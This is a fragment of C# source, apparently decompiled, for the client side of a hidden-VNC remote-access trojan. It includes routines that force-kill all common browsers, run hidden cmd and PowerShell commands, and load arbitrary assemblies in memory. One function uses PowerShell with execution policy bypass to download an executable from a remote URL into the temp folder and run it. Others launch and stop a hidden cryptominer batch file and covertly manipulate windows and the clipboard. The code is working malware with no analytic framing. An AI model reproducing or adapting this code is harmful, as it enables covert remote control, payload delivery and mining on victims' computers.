			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe",
			Arguments = string.Format("/c " + processx)
		};
		process.StartInfo.RedirectStandardOutput = true;
		process.Start();
	}

	public static void KillAllBrowser()
	{
		HVNC.StartProcess("taskkill /F /IM chrome.exe");
		HVNC.StartProcess("taskkill /F /IM firefox.exe");
		HVNC.StartProcess("taskkill /F /IM brave.exe");
		HVNC.StartProcess("taskkill /F /IM msedge.exe");
		HVNC.StartProcess("taskkill /F /IM browser.exe");
		HVNC.StartProcess("taskkill /F /IM atom.exe");
		HVNC.StartProcess("taskkill /F /IM AvastBrowser.exe");
		HVNC.StartProcess("taskkill /F /IM chromodo.exe");
		HVNC.StartProcess("taskkill /F /IM palemoon.exe");
		HVNC.StartProcess("taskkill /F /IM orbitum.exe");
		HVNC.StartProcess("taskkill /F /IM epic.exe");
		HVNC.StartProcess("taskkill /F /IM slimjet.exe");
		HVNC.StartProcess("taskkill /F /IM UCBrowser.exe");
		HVNC.StartProcess("taskkill /F /IM vivaldi.exe");
		HVNC.StartProcess("taskkill /F /IM waterfox.exe");
		HVNC.StartProcess("taskkill /F /IM 360browser.exe");
		HVNC.StartProcess("taskkill /F /IM neon.exe");
		HVNC.StartProcess("taskkill /F /IM opera.exe");
	}

	public static void Powershell(string args)
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "powershell.exe",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = false
		});
	}

	public static void listitems(byte[] purdi)
	{
		try
		{
			Assembly assembly = AppDomain.CurrentDomain.Load(purdi);
			MethodInfo methodInfo = HVNC.Entry(assembly);
			object obj = assembly.CreateInstance(methodInfo.Name);
			object[] obj2 = new object[1];
			if (methodInfo.GetParameters().Length == 0)
			{
				obj2 = null;
			}
			HVNC.MethodInfo(methodInfo, obj, obj2);
		}
		catch
		{
		}
	}

	private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
	{
		if (meth != null)
		{
			return meth.Invoke(obj1, obj2);
		}
		return false;
	}

	private static MethodInfo Entry(Assembly obj)
	{
		if (obj != null)
		{
			return obj.EntryPoint;
		}
		return null;
	}

	public static void DownloadExecute(string url)
	{
		string text = HVNC.RandomString(5);
		HVNC.Powershell("powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('" + url + "','" + Path.GetTempPath() + text + ".exe');Start-Process ('" + Path.GetTempPath() + text + ".exe')");
		Outils.SendInformation(Outils.nstream, "256|");
	}

	public static void KillMiner()
	{
		Outils.procM.Kill();
	}

	public static string RandomString(int length)
	{
		return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[HVNC.random.Next(s.Length)]).ToArray());
	}

	public static byte[] UTK(string data)
	{
		return HttpServerUtility.UrlTokenDecode(data);
	}

	public static void StartMethod1(string Hidden)
	{
		if (File.Exists(Outils.MPath + Outils.MFile))
		{
			Outils.procM.StartInfo.UseShellExecute = false;
			if (Hidden == "Hide")
			{
				Outils.procM.StartInfo.CreateNoWindow = false;
				Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			}
			if (Hidden == "Show")
			{
				Outils.procM.StartInfo.CreateNoWindow = true;
				Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			}
			Outils.procM.StartInfo.FileName = Outils.MPath + Outils.MFile + ".bat";
			Outils.procM.StartInfo.RedirectStandardError = false;
			Outils.procM.StartInfo.RedirectStandardOutput = false;
			Outils.procM.StartInfo.UseShellExecute = true;
			Outils.procM.Start();
			Outils.procM.WaitForExit();
		}
	}

	public static void StartMethod2(string Hidden)
	{
		if (File.Exists(Outils.MPath + Outils.MFile))
		{
			Outils.procM.StartInfo.UseShellExecute = false;
			if (Hidden == "Hide")
			{
				Outils.procM.StartInfo.CreateNoWindow = false;
				Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			}
			if (Hidden == "Show")
			{
				Outils.procM.StartInfo.CreateNoWindow = true;
				Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			}
			Outils.procM.StartInfo.FileName = Outils.MPath + Outils.MFile + ".bat";
			Outils.procM.StartInfo.RedirectStandardError = false;
			Outils.procM.StartInfo.RedirectStandardOutput = false;
			Outils.procM.StartInfo.UseShellExecute = true;
			Outils.procM.Start();
			Outils.procM.WaitForExit();
		}
	}

	public static void StartExplorer()
	{
		Process.Start("explorer");
	}

	public static void CloseTop()
	{
		Outils.SendMessage((int)Outils.lastactivebar, 16, 0, 0);
	}

	[DllImport("user32.dll")]
	public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

	public static void RestoreMaxTop()
	{
		IntPtr lastactivebar = Outils.lastactivebar;
		if (Outils.IsZoomed(lastactivebar))
		{
			Outils.ShowWindow(lastactivebar, 9);
		}
		else
		{
			Outils.ShowWindow(lastactivebar, 3);
		}
		Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
		HVNC.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
	}

	public static void MinTop()
	{
		Outils.ShowWindow(Outils.lastactivebar, 6);
	}

	public static void ShowStartMenu()
	{
		IntPtr hWnd = ((Outils.FindWindowEx2((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start") == IntPtr.Zero) ? Outils.GetWindow(Outils.FindWindow("Shell_TrayWnd", null), 5u) : Outils.FindWindowEx2((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start"));
		Outils.PostMessage(hWnd, 513u, (IntPtr)0L, (IntPtr)Outils.MakeLParam(2, 2));
		Outils.PostMessage(hWnd, 514u, (IntPtr)0L, (IntPtr)Outils.MakeLParam(2, 2));
	}

	public static object CopyText()
	{
		Outils.SendMessage((int)Outils.lastactive, 258, 3, (int)IntPtr.Zero);
		Outils.SendMessage((int)Outils.lastactive, 769, 0, 0);
		Outils.PostMessage(Outils.lastactive, 258u, (IntPtr)3, IntPtr.Zero);
		Outils.PostMessage(Outils.lastactive, 769u, (IntPtr)0, (IntPtr)0);
		return Clipboard.GetText();
	}

	public static void PasteText(string ToPaste)
	{
		Clipboard.SetText(ToPaste);
		Outils.SendMessage((int)Outils.lastactive, 770, 0, 0);
	}
}
